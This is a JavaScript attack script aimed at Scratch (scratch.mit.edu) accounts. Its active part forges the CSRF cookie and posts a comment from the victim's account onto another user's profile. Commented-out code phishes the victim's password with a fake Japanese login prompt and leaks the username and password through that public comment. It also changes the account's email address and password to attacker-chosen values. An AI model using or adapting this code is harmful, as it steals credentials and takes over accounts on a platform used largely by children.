function getCookieArray(){
  var arr = new Array();
  if(document.cookie != ''){
      var tmp = document.cookie.split('; ');
      for(var i=0;i<tmp.length;i++){
          var data = tmp[i].split('=');
          arr[data[0]] = decodeURIComponent(data[1]);
      }
  }

  var memo = arr;
  let taken = memo['scratchcsrftoken'];
  return taken
}
 let token="";
  {
    let cookie=document.cookie;
    cookie=cookie.split(';');
    let cok=[[],[]];
    cookie.forEach(function(element){
        const elements=element.split("=");
        cok[0].push(elements[0]);
        cok[1].push(elements[1]);
    });
    token=cok[1][cok[0].indexOf(' scratchcsrftoken')];
  }
async function a(){
  /*const sessiontoken = (await(await fetch("/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.token;

  
    const username = (await(await fetch("/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.username;
    var password=prompt("ログインのためのパスワードを入力");
    let logout=await fetch("https://scratch.mit.edu/accounts/logout/",{method:"POST","headers":{"x-csrftoken":token}});
    var login=await fetch("https://scratch.mit.edu/accounts/login/",{method:"POST",body:JSON.stringify({"username":username,"password":password,"useMessages":false}),"headers":{"x-csrftoken":token,"x-requested-with": "XMLHttpRequest"}});
    while(login.status!==200){
        var password=prompt(login.status+"ログインに失敗しました。ログインのためのパスワードを入力");
        var login=await fetch("https://scratch.mit.edu/accounts/login/",{method:"POST",body:JSON.stringify({"username":username,"password":password,"useMessages":false}),"headers":{"x-csrftoken":token,"x-requested-with": "XMLHttpRequest"}});
    }
    let content=Math.random().toString()+" used.,"+username+password; */
	let content=Math.random().toString()+" used.,";

let token2="";
  {
    let cookie=document.cookie;
    cookie=cookie.split(';');
    let cok=[[],[]];
    cookie.forEach(function(element){
        const elements=element.split("=");
        cok[0].push(elements[0]);
        cok[1].push(elements[1]);
    });
    token2=cok[1][cok[0].indexOf(' scratchcsrftoken')];
  }
  document.cookie="scratchcsrftoken=a;path=/;domain=.scratch.mit.edu";
  let comment=await fetch(`https://scratch.mit.edu/site-api/comments/user/yamaguchi03/add/`,{
    method: "POST",
    body: JSON.stringify({
      content: content,
      parent_id: "232128104",
      commentee_id: "62203658"
    }),
    headers: {
      'X-CSRFToken': "a"
    }
  });
	//let email=await fetch("https://scratch.mit.edu/accounts/email_change/", {
	//  "headers": {
	//    "content-type": "application/x-www-form-urlencoded"
	//  },
	//  "body": `csrfmiddlewaretoken=${token}&email_address=namomehu%40choco.la&password=${password}`,
	//  "method": "POST"
	//});
	//await fetch("https://scratch.mit.edu/accounts/password_change/", {
	//  "headers": {
	//    "content-type": "application/x-www-form-urlencoded"
	//  },
	//  "body": `csrfmiddlewaretoken=${token}&old_password=${password}&new_password1=haruwata0853&new_password2=haruwata0853`,
	//  "method": "POST",
	//});
  //console.log(email.status);
}
a();
